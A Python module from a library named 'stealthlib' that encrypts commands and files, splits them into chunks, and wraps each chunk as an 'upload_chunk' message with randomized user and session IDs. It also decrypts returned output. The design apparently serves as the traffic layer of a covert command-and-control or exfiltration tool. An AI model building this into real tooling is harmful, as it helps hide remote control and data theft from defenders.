import uuid
from stealthlib.chunking import Chunking

class Protocol:
    def __init__(self, encryption, min_chunk_size=512 * 1024, max_chunk_size=1024 * 1024):
        self.encryption = encryption
        self.chunker = Chunking(min_chunk_size, max_chunk_size)

    @staticmethod
    def generate_random_id():
        """
        Generates a random ID for user_id or session_id.
        Format: 8-4-4-4-12 (UUID-like structure).
        """
        return str(uuid.uuid4())

    def prepare_command(self, command):
        """
        Prepares a command payload for secure transmission using the specified JSON structure.
        """
        encrypted_command = self.encryption.encrypt(command.encode()).decode()
        return {
            "action": "upload_chunk",
            "metadata": {
                "user_id": self.generate_random_id(),
                "session_id": self.generate_random_id()
            },
            "data": encrypted_command
        }

    def parse_response(self, response):
        """
        Parses and decrypts a response payload received in the specified JSON structure.
        """
        encrypted_output = response.get("data")
        return self.encryption.decrypt(encrypted_output.encode()).decode()

    def prepare_file_transfer(self, file_data):
        """
        Prepares a file for transfer by splitting it into chunks and encrypting each chunk.
        Outputs each chunk in the specified JSON structure with randomized metadata.
        """
        chunks = []
        for i, chunk in enumerate(self.chunker.split_data(file_data)):
            encrypted_chunk = self.encryption.encrypt(chunk).decode()
            chunks.append({
                "action": "upload_chunk",
                "metadata": {
                    "user_id": self.generate_random_id(),
                    "session_id": self.generate_random_id(),
                    "sequence": i
                },
                "data": encrypted_chunk
            })
        return chunks

    def reconstruct_file(self, encrypted_chunks):
        """
        Reconstructs a file from encrypted chunks by decrypting and joining them.
        Each chunk is assumed to be in the specified JSON structure.
        """
        # Sort chunks by sequence to ensure correct order
        encrypted_chunks.sort(key=lambda x: x["metadata"]["sequence"])
        decrypted_chunks = [
            self.encryption.decrypt(chunk["data"].encode())
            for chunk in encrypted_chunks
        ]
        return self.chunker.join_chunks(decrypted_chunks)
      
